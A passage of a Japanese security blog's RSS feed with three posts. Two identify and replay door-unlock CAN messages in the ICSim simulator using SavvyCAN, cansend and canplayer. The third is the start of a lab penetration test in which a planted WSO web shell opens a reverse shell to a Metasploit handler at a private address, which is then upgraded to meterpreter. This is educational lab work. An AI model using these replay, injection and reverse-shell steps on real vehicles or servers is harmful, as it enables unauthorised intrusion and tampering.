&lt;li&gt;Hacking the CAN Bus: Basic Manipulation of a Modern Automobile Through CAN Bus Reverse Engineering&lt;br&gt;
&lt;a href=&#34;https://www.sans.org/reading-room/whitepapers/awareness/paper/37825&#34;&gt;https://www.sans.org/reading-room/whitepapers/awareness/paper/37825&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>ECUの車速に関するCANメッセージを特定して騙す</title>
        <link>https://www.shutingrz.com/post/can-training3/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>ドア開錠を行うCAN通信を特定する</title>
      <link>https://www.shutingrz.com/post/can-training2/</link>
      <pubDate>Mon, 22 Jul 2019 03:37:54 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/can-training2/</guid>
      <description>&lt;p&gt;今回も引き続きシミュレーション環境のICSimでCAN通信の勉強。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.shutingrz.com/post/can-training-first/&#34;&gt;前回&lt;/a&gt; はどのCANメッセージがドアをあけるものなのかわからないながらも、通信そのままリプレイさせることでドアの開錠を成功させた。&lt;/p&gt;
&lt;p&gt;今回は、どのCANメッセージがドアをあける通信なのか特定を試みる。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;環境&#34;&gt;環境&lt;/h3&gt;
&lt;p&gt;Ubuntu 18.04 Desktop&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;CAN通信をモニターしてフィルタするソフトウェアはいくつか存在する。&lt;/p&gt;
&lt;p&gt;が、色々試していくうちに現時点においては&lt;strong&gt;SavvyCAN&lt;/strong&gt;がOSSの中で最高のCANモニターだと思ったのでSavvyCANを使ってドア解錠のメッセージを特定していく。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;※カーハッカーズハンドブックではSavvyCANは巻末付録で紹介されているが、内容が古く「SocketCANには対応していない」旨のコメントがある。&lt;br&gt;
　現在はSocketCANに対応しているし何ならNetwork経由でもモニタできるようになっているっぽいのでイチオシ。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;savvycan-のインストール&#34;&gt;SavvyCAN のインストール&lt;/h1&gt;
&lt;h3 id=&#34;qt5のインストール&#34;&gt;Qt5のインストール&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ wget https://download.qt.io/official_releases/qt/5.12/5.12.4/qt-opensource-linux-x64-5.12.4.run
$ chmod a+x ./qt-opensource-linux-x64-5.12.4.run 
$ sudo ./qt-opensource-linux-x64-5.12.4.run 
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;qtライブラリのインストール&#34;&gt;qtライブラリのインストール&lt;/h3&gt;
&lt;p&gt;qtserialbusは Ubuntu 18.04 では aptの公式リポジトリに含まれないので自分でビルドする。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ sudo apt install qtdeclarative5-dev qttools5-dev g++
$ git clone https://github.com/qt/qtserialbus
$ cd qtserialbus
$ /opt/Qt5.12.4/5.12.4/gcc_64/bin/qmake .
$ make
$ sudo make install
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;savvycanのビルド&#34;&gt;SavvyCANのビルド&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ git clone https://github.com/collin80/SavvyCAN
$ cd SavvyCAN
$ /opt/Qt5.12.4/5.12.4/gcc_64/bin/qmake CONFIG+=debug
$ make
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;起動&#34;&gt;起動&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./SavvyCAN
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;vcan0に接続&#34;&gt;vcan0に接続&lt;/h3&gt;
&lt;p&gt;Connection Settings -&amp;gt; Add New Device Connection で新規接続。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Connection Type: QT SerialBus Devices&lt;/li&gt;
&lt;li&gt;SerialBus Device Type: socketcan&lt;/li&gt;
&lt;li&gt;Port: vcan0&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
  &lt;img src=&#34;add_device.png&#34; alt=&#34;add_device&#34;&gt;
&lt;/p&gt;
&lt;p&gt;ICSimを起動しておくと、接続後に大量のCANデータが流れることを確認できる。&lt;/p&gt;
&lt;h1 id=&#34;savvycanを使ってドア開錠通信を特定&#34;&gt;SavvyCANを使ってドア開錠通信を特定&lt;/h1&gt;
&lt;p&gt;まず前提として、CAN通信の話。&lt;/p&gt;
&lt;p&gt;リアルタイムに情報が必要となるエンジン・ステアリング・車軸センサー周りのECUは、常に自らの情報を定期的にCANバスを垂れ流しているものだという。&lt;br&gt;
その結果、CANバスには常に情報が溢れているとのこと。&lt;/p&gt;
&lt;p&gt;ただ今回はドアの開錠を行う操作を見つけ出す。&lt;br&gt;
これは「トリガー」を発生させることになるので、CANメッセージの中でそのCAN IDは非常に少ない（トリガーごとに1個あるいは数個）ことが予想される。&lt;/p&gt;
&lt;p&gt;つまりドア開錠操作を発生させたときに初めて出現するCAN IDを見つけ出す。&lt;/p&gt;
&lt;p&gt;SavvyCANではデータが流れる順に表示される標準モード以外に、「Overwrite Mode」という、各CAN IDごとの最新データが表示されるモードが存在する。&lt;/p&gt;
&lt;p&gt;表示には統計情報としてCntカラムがあり、そしてクリックでソートできるので、ドア開錠を発生させたときに初めてカラムが追加されCntが非常に少ないようなCAN IDがドア開錠メッセージであることが推測できる。&lt;/p&gt;
&lt;br/&gt;
&lt;h2 id=&#34;canバスをキャプチャしそれっぽいものを探す&#34;&gt;CANバスをキャプチャしそれっぽいものを探す&lt;/h2&gt;
&lt;p&gt;ということでやってみた。手順は以下。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;SavvyCANをOverWrite Modeにしておく。&lt;/li&gt;
&lt;li&gt;キャプチャを開始する。&lt;/li&gt;
&lt;li&gt;Cntでソートし、一番少ないCntのところを注視しておく。&lt;/li&gt;
&lt;li&gt;ICSimのコントローラーで左フロントドアを開錠する。&lt;/li&gt;
&lt;li&gt;開錠操作後に初めて追加されてCntが非常に少ないCAN IDを探す。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;動画でどうぞ。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;detect_doorlock.gif&#34; alt=&#34;detect_doorlock&#34;&gt;
&lt;/p&gt;
&lt;br/&gt;
&lt;p&gt;すぐにわかる。ドア開錠メッセージのCAN IDは0x19Bっぽい。データは「00 00 0E 00 00 00」。&lt;/p&gt;
&lt;h2 id=&#34;ドアが開錠するか試す&#34;&gt;ドアが開錠するか試す&lt;/h2&gt;
&lt;p&gt;実際に試してみる。&lt;/p&gt;
&lt;p&gt;SavvyCANのPlayback機能を使って通信を送ることもできるが、今回送るメッセージは１つだけなのでcansendの方がわかりやすい。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cansend vcan0 19B#00.00.0E.00.00.00
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;動画でどうぞ（スマホは見づらいかも）&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;send_doorlock.gif&#34; alt=&#34;send_doorlock&#34;&gt;
&lt;/p&gt;
&lt;p&gt;見事に開いた！SavvyCANいいっすね＾～&lt;/p&gt;
&lt;h1 id=&#34;全てのドア開錠通信を調べる&#34;&gt;全てのドア開錠通信を調べる&lt;/h1&gt;
&lt;p&gt;ICSimは全てで4つのドアがある。全てのパターンを試したところ、全てCAN IDは 0x19Bだった。&lt;/p&gt;
&lt;p&gt;データは以下の対応だった。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ドアの状態&lt;/th&gt;
&lt;th&gt;操作&lt;/th&gt;
&lt;th&gt;データ3バイト目&lt;/th&gt;
&lt;th&gt;2進数&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;全て閉じている&lt;/td&gt;
&lt;td&gt;左フロントドア開錠&lt;/td&gt;
&lt;td&gt;0E&lt;/td&gt;
&lt;td&gt;0000 1110&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;上列操作後の状態&lt;/td&gt;
&lt;td&gt;右フロントドア開錠&lt;/td&gt;
&lt;td&gt;0C&lt;/td&gt;
&lt;td&gt;0000 1100&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;上列操作後の状態&lt;/td&gt;
&lt;td&gt;左リアドア開錠&lt;/td&gt;
&lt;td&gt;08&lt;/td&gt;
&lt;td&gt;0000 1000&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;上列操作後の状態&lt;/td&gt;
&lt;td&gt;右リアドア開錠(-&amp;gt;全て開いた)&lt;/td&gt;
&lt;td&gt;00&lt;/td&gt;
&lt;td&gt;0000 0000&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;表の2進数を見れば一目瞭然。ドアの状態はドアごとにビットで管理されてるようだ。&lt;br&gt;
ちなみにドアを順次閉じていき、全て閉めたところのCANメッセージは 0F (0000 1111)だった。&lt;/p&gt;
&lt;p&gt;特定のドアを開けたい場合は、そのドアに対応したビットを0にして、 CAN IDが 0x19B なメッセージを送れば良さそう。&lt;/p&gt;
&lt;h1 id=&#34;まとめ&#34;&gt;まとめ&lt;/h1&gt;
&lt;p&gt;SavvyCANを使ってICSimのCAN通信からドアを開錠するCAN IDを探して再現することができた。&lt;/p&gt;
&lt;p&gt;ただこれがドアを開け閉めさせるトリガーとなる通信なのか、それともコントローラ内部でドアを開け閉めしたあと、今のドア状態をみんなに伝えますという意味の通信なのか、どちらかよくわからない。&lt;/p&gt;
&lt;p&gt;もし後者ならば、仮に攻撃者が詐称したとしても運転席のメーターパネルが「ドア開いてますよ」とピーピーなるだけで肝心のドアロックは開かないのでは🤔&lt;br&gt;
(実車はどうなってるのか・・・試したいけど車がない😭)&lt;/p&gt;
&lt;br/&gt;
&lt;p&gt;それと、今回はICSimがコントローラーによる操作のときだけ該当通信を発生させていたおかげでCntが極小となり統計解析で見つけやすかったが、全体のドアの状態を送る形式なら原理上定期的にCANメッセージを発生させていてもいいはずなので、もしそうだったら見つけるのは大変だったかも。&lt;br&gt;
(実車はどうなってるのか・・・試したいけど車がない😭)&lt;/p&gt;
&lt;br/&gt;
&lt;h3 id=&#34;savvycanについて&#34;&gt;SavvyCANについて&lt;/h3&gt;
&lt;p&gt;実際に色々使ってみるとわかりますが、SavvyCANは高機能であるものの、色んなグラフを見るとき特定のデータでnull pointerにアクセスしてクラッシュすることが割とよくあります。&lt;/p&gt;
&lt;p&gt;ただ原因はわりと単純だったりするし、しかも開発者のcollin氏もすぐに直してくれるので、バグに気付いたらぜひ&lt;a href=&#34;https://github.com/collin80/SavvyCAN&#34;&gt;Github&lt;/a&gt;にPRやissueを投げてもらえると非常に助かります。&lt;/p&gt;
&lt;p&gt;自分も使って初日で2箇所もクラッシュにハマりましたが、原因を特定して&lt;a href=&#34;https://github.com/collin80/SavvyCAN/issues/203&#34;&gt;Issueを投げたり&lt;/a&gt;、&lt;a href=&#34;https://github.com/collin80/SavvyCAN/pull/204&#34;&gt;PRを送ったり&lt;/a&gt;したら1日もせずに修正を取り込んでくれました。&lt;/p&gt;
&lt;h3 id=&#34;参考&#34;&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;カーハッカーズハンドブック&lt;br&gt;
&lt;a href=&#34;https://www.amazon.co.jp/dp/4873118239&#34;&gt;https://www.amazon.co.jp/dp/4873118239&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;はじめてのCAN/CAN FD&lt;br&gt;
&lt;a href=&#34;https://www.vector.com/jp/ja/know-how/beginners/beginners-cancan-fd-jp/&#34;&gt;https://www.vector.com/jp/ja/know-how/beginners/beginners-cancan-fd-jp/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;SavvyCAN&lt;br&gt;
&lt;a href=&#34;https://www.savvycan.com/&#34;&gt;https://www.savvycan.com/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;次回は何をしよう・・・車が欲しい・・・・。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>ドア開錠を行うCAN通信を特定する</title>
        <link>https://www.shutingrz.com/post/can-training2/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>シミュレーション環境でCAN通信を試す</title>
      <link>https://www.shutingrz.com/post/can-training-first/</link>
      <pubDate>Tue, 16 Jul 2019 00:02:39 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/can-training-first/</guid>
      <description>&lt;p&gt;車がなくてもカーセキュリティの勉強がしたい！&lt;/p&gt;
&lt;p&gt;ということでカーハッカーズハンドブックを読みつつICSimを使ってCAN通信を試してみる。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;環境&#34;&gt;環境&lt;/h3&gt;
&lt;p&gt;Ubuntu 18.04.2 LTS Desktop&lt;/p&gt;
&lt;h3 id=&#34;参考&#34;&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;カーハッカーズハンドブック&lt;br&gt;
&lt;a href=&#34;https://www.amazon.co.jp/dp/4873118239&#34;&gt;https://www.amazon.co.jp/dp/4873118239&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Playing with SocketCan using can-utils&lt;br&gt;
&lt;a href=&#34;https://dayba.wordpress.com/2017/05/25/playing-with-socketcan-using-can-utils/&#34;&gt;https://dayba.wordpress.com/2017/05/25/playing-with-socketcan-using-can-utils/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;canを使えるようにする&#34;&gt;CANを使えるようにする&lt;/h2&gt;
&lt;p&gt;can-utilsのインストール&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt install can-utils
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;仮想CANデバイス機能の有効化&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;modprobe vcan
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;仮想canインターフェイス-vcanの設定&#34;&gt;仮想CANインターフェイス vcanの設定&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ip link add dev vcan0 type vcan
ip link set up vcan0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;vcan0があることを確認&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ ip link show dev vcan0
3: vcan0: &amp;lt;NOARP,UP,LOWER_UP&amp;gt; mtu 72 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
    link/can
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;icsimのインストール&#34;&gt;ICSimのインストール&lt;/h2&gt;
&lt;h3 id=&#34;icsimのダウンロード&#34;&gt;ICSimのダウンロード&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/zombieCraig/ICSim
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;必要なパッケージのインストール&#34;&gt;必要なパッケージのインストール&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt-get install libsdl2-dev libsdl2-image-dev can-utils
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;※vcanを作成していない場合、setup_vcan.shを実行すればvcan0が作成される&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;can通信の取得---icsimのcan通信をみてみる&#34;&gt;CAN通信の取得 - ICSimのCAN通信をみてみる&lt;/h1&gt;
&lt;p&gt;ICSimのモニタとコントローラーを起動する。それぞれ別のコンソールで操作をする。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;コンソール1&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./icsim vcan0
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;コンソール2&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;./controls vcan0
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
  &lt;img src=&#34;icsim.png&#34; alt=&#34;icsim&#34;&gt;
&lt;/p&gt;
&lt;p&gt;すごい。コントローラーがなくてもキーボードでドアをあけたりスピードを上げたりできた。&lt;/p&gt;
&lt;p&gt;この状態でcandumpを使う。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ candump vcan0

  vcan0  166   [4]  D0 32 00 18
  vcan0  158   [8]  00 00 00 00 00 00 00 19
  vcan0  161   [8]  00 00 05 50 01 08 00 1C
  vcan0  191   [7]  01 00 10 A1 41 00 0B
  vcan0  164   [8]  00 00 C0 1A A8 00 00 04
  vcan0  133   [5]  00 00 00 00 A7
  vcan0  136   [8]  00 02 00 00 00 00 00 2A
  vcan0  13A   [8]  00 00 00 00 00 00 00 28
  vcan0  13F   [8]  00 00 00 05 00 00 00 2E
  vcan0  17C   [8]  00 00 00 00 10 00 00 21
  vcan0  18E   [3]  00 00 6B
  vcan0  1CF   [6]  80 05 00 00 00 1E
  vcan0  1DC   [4]  02 00 00 1B
  vcan0  183   [8]  00 00 00 0E 00 00 10 2B
  vcan0  143   [4]  6B 6B 00 E0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;大量にCAN通信がダンプされる。&lt;/p&gt;
&lt;p&gt;candumpのヘルプを参照し、オプションもりもりにしておくといい感じに見えた。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ candump -d -x -e -a vcan0 
  vcan0  TX - -  244   [5]  00 00 00 01 13            &amp;#39;.....&amp;#39;
  vcan0  TX - -  1CF   [6]  80 05 00 00 00 1E         &amp;#39;......&amp;#39;
  vcan0  TX - -  1DC   [4]  02 00 00 1B               &amp;#39;....&amp;#39;
  vcan0  TX - -  320   [3]  00 00 12                  &amp;#39;...&amp;#39;
  vcan0  TX - -  324   [8]  74 65 00 00 00 00 0E 1A   &amp;#39;te......&amp;#39;
  vcan0  TX - -  37C   [8]  FD 00 FD 00 09 7F 00 1A   &amp;#39;........&amp;#39;
  vcan0  TX - -  40C   [8]  02 36 32 32 39 53 30 39   &amp;#39;.6229S09&amp;#39;
  vcan0  TX - -  183   [8]  00 00 00 0E 00 00 10 2B   &amp;#39;.......+&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;-d : 欠落したCANフレームもモニタ&lt;/li&gt;
&lt;li&gt;-x : RX/TX、CAN-FD の BRSビット、ESIビットの情報を表示&lt;/li&gt;
&lt;li&gt;-e : CANのエラーフレームを読める形でダンプする&lt;/li&gt;
&lt;li&gt;-a : アスキー表示もする&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;どのメッセージが何の意味を持っているのかは現状わからないが、それぞれ大事な役割があるんだろうなあ。&lt;/p&gt;
&lt;h1 id=&#34;canメッセージを出してみる&#34;&gt;CANメッセージを出してみる&lt;/h1&gt;
&lt;p&gt;cansendを使う。&lt;/p&gt;
&lt;p&gt;予めcandumpを起動しておく。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cansend vcan0 001#11.22.33.44.55.66.77.88
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;※色んなデータ表現や、8バイトCAN ID、CAN-FDもいける。詳しくはヘルプを参照。&lt;/p&gt;
&lt;p&gt;candumpの結果をみる。&lt;br&gt;
ICSimのノイズが多いのでCAN IDでフィルタをしておくとよい。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;フィルタに関する参考URL&lt;br&gt;
&lt;a href=&#34;https://wiki.linklayer.com/index.php/CAN_Filters&#34;&gt;https://wiki.linklayer.com/index.php/CAN_Filters&lt;/a&gt;&lt;br&gt;
カーハッカーズハンドブック P.78にもわかりやすい説明がある。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ candump -d -x -e -a vcan0,001:7FF
  vcan0  TX - -  001   [8]  11 22 33 44 55 66 77 88   &amp;#39;.&amp;#34;3DUfw.&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;CANメッセージが送られていることがわかる。&lt;/p&gt;
&lt;h1 id=&#34;canメッセージを保存し再送をしてみる&#34;&gt;CANメッセージを保存し、再送をしてみる&lt;/h1&gt;
&lt;p&gt;candumpのオプションでCAN通信をSocketCANコンパクト形式で保存できる。&lt;br&gt;
また、canplayerで保存したSocketCANコンパクト形式ファイルを読み込んでCAN通信を発生させられる。&lt;br&gt;
これができればリプレイ攻撃を試せる気がする。&lt;/p&gt;
&lt;h2 id=&#34;1canメッセージを保存&#34;&gt;1.CANメッセージを保存&lt;/h2&gt;
&lt;h3 id=&#34;candumpで保存開始&#34;&gt;candumpで保存開始&lt;/h3&gt;
&lt;p&gt;-lオプションを使えば、SocketCANコンパクト形式で自動的に決められた命名規則でファイルに保存される。&lt;br&gt;
しかしこれだと標準出力が無効化され、またファイル名を自分で決めることができない。&lt;/p&gt;
&lt;p&gt;-LオプションはSocketCANコンパクト形式を標準出力で出してくれるので、これにteeコマンドを併用して通信を保存したほうが見やすい気がする。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ candump -L vcan0,001:7FF | tee test1.can
&lt;/code&gt;&lt;/pre&gt;&lt;/br&gt;
&lt;h3 id=&#34;cansendで通信を発生させる&#34;&gt;cansendで通信を発生させる&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cansend vcan0 001#11.22.33.44.55.66.77.88
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;コマンド実行後、candumpを終了させる。&lt;/p&gt;
&lt;p&gt;test1.canにSocketCANコンパクト形式で保存されているか確認。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ cat test1.can 
(1563199857.105987) vcan0 001#1122334455667788
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;いい感じだ。&lt;/p&gt;
&lt;h2 id=&#34;2canメッセージを再送&#34;&gt;2.CANメッセージを再送&lt;/h2&gt;
&lt;p&gt;予めcandumpを起動しておく。&lt;/p&gt;
&lt;h3 id=&#34;canplayerでメッセージを再送&#34;&gt;canplayerでメッセージを再送&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ canplayer -I test1.can
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;candumpの表示をみる。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ candump -d -x -e -a vcan0,001:7FF
  vcan0  TX - -  001   [8]  11 22 33 44 55 66 77 88   &amp;#39;.&amp;#34;3DUfw.&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;うまくCANメッセージが送信できていることが確認できた。&lt;/p&gt;
&lt;h1 id=&#34;リプレイ攻撃でicsimのドアを開けてみる&#34;&gt;リプレイ攻撃でICSimのドアを開けてみる&lt;/h1&gt;
&lt;p&gt;canplayerがちゃんと仕事をしてくれていることがわかったので、実際の攻撃を試してみる。&lt;/p&gt;
&lt;h2 id=&#34;流れ&#34;&gt;流れ&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;ICSimとcontrollerを起動する&lt;/li&gt;
&lt;li&gt;candumpでメッセージを保存するようにする&lt;/li&gt;
&lt;li&gt;controllerでドアを開ける&lt;/li&gt;
&lt;li&gt;ドアを開けたあと、candumpを終了する&lt;/li&gt;
&lt;li&gt;開けたドアをしめておく&lt;/li&gt;
&lt;li&gt;canplayerを実行し、CANメッセージを再送する&lt;/li&gt;
&lt;li&gt;ドアが開いたか確認する&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;candumpでドアを開ける通信をキャプチャ&#34;&gt;candumpでドアを開ける通信をキャプチャ&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ candump -d -L vcan0  | tee open_door.can
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;canplayerでドアを開ける&#34;&gt;canplayerでドアを開ける&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ canplayer -I open_door.can 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;gifでどうぞ。

  &lt;img src=&#34;replay-open_door.gif&#34; alt=&#34;replay-open_door&#34;&gt;
&lt;/p&gt;
&lt;p&gt;開いた！多分できている気がする。&lt;/p&gt;
&lt;h1 id=&#34;まとめ&#34;&gt;まとめ&lt;/h1&gt;
&lt;p&gt;実際のCANデバイスがなくても通信出したりキャプチャしたり楽しめた。&lt;br&gt;
またCANメッセージそれぞれの意味がわからなくても、まるごと通信をキャプチャすることでシミュレーション環境上とはいえリプレイ攻撃ができることもわかった。&lt;/p&gt;
&lt;p&gt;※最近の車に搭載されているECUのCAN通信はMACが付加されており単純なリプレイ攻撃はできない模様。&lt;/p&gt;
&lt;p&gt;カーハッカーズハンドブックを読み進めてまた色々試してみます。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>シミュレーション環境でCAN通信を試す</title>
        <link>https://www.shutingrz.com/post/can-training-first/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>ペネトレ検証-権限昇格とWildcard Injectionの原理</title>
      <link>https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/</link>
      <pubDate>Mon, 13 May 2019 03:15:21 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/ad_hack-linux_priv_escalation/</guid>
      <description>&lt;p&gt;しゅーとです。&lt;/p&gt;
&lt;p&gt;引き続きペネトレーションテストの検証をしていきます。&lt;br&gt;
前回の記事はこちら。&lt;br&gt;
&lt;br/&gt;
&lt;a href=&#34;https://www.shutingrz.com/post/ad_hack-ec_exploit/&#34;&gt;ペネトレ検証-ECサイトに侵入&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;前回はECShopの脆弱性を用いてRCE、そしてwww-data権限でのバックドア作成に成功しました。&lt;/p&gt;
&lt;p&gt;今回はLinuxでの権限昇格です。&lt;/p&gt;
&lt;h3 id=&#34;権限昇格したい&#34;&gt;権限昇格したい！&lt;/h3&gt;
&lt;p&gt;現状コントロールできているのはwww-dataユーザの権限であり、rootではありません。&lt;/p&gt;
&lt;p&gt;ここから横展開するにあたり、root権限はぜひとも取っておきたいものです。&lt;br&gt;
そこで今回は権限昇格できるかを調査・試行します。&lt;/p&gt;
&lt;p&gt;またfindコマンドに対するWildcard Injection を用いた侵害の説明をふんだんにしています。&lt;/p&gt;
&lt;p&gt;そして今回も攻撃後にブルーチーム目線で攻撃の痕跡がどう残っているかも確認します。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;metapreterでラクラクやりたい&#34;&gt;metapreterでラクラクやりたい&lt;/h1&gt;
&lt;p&gt;現状の手札は、永続化のために設置したWSOのバックドア（www-dataユーザ）のみ。&lt;/p&gt;
&lt;p&gt;特権昇格など色々な試行をするためにmeterpreterは便利なので使うことにします。&lt;/p&gt;
&lt;p&gt;ECShopが稼働しているサーバにncコマンドは入っていませんでしたが、WSOはリバースシェル接続の機能があります。&lt;br&gt;
そのためWSOのリバースシェル経由で meterpreter に接続します。&lt;/p&gt;
&lt;p&gt;まずはAttackerのmsfで普通の shell/reverse_tcp を待ち受けます。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf5 exploit(multi/handler) &amp;gt; show options
(snip)
Payload options (linux/x64/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.2.22     yes       The listen address (an interface may be specified)
   LPORT  12345            yes       The listen port
(snip)

msf5 exploit(multi/handler) &amp;gt; run

[*] Started reverse TCP handler on 192.168.2.22:12345 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WSO の Network toolsで、リバースシェルを張りにいきます。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./wso_reverse.png&#34;/&gt;
&lt;/figure&gt;

&lt;br/&gt; 
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;[*] Sending stage (38 bytes) to 192.168.2.24
[*] Command shell session 1 opened (192.168.2.22:12345 -&amp;gt; 192.168.2.24:47686) at 2019-05-12 03:35:59 +0900
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;きました。&lt;/p&gt;
&lt;p&gt;次はmeterpreterにスイッチします。スイッチには shell_to_meterpreter を使います。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;msf5 post(multi/manage/shell_to_meterpreter) &amp;gt; show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  1                yes       The session to run this module on.
&lt;/code&gt;&lt;/pre&gt;&lt;br/&gt;
&lt;p&gt;実行します。&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;./switch_meterpreter.png&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;無事 meterpreter へスイッチできました。&lt;/p&gt;
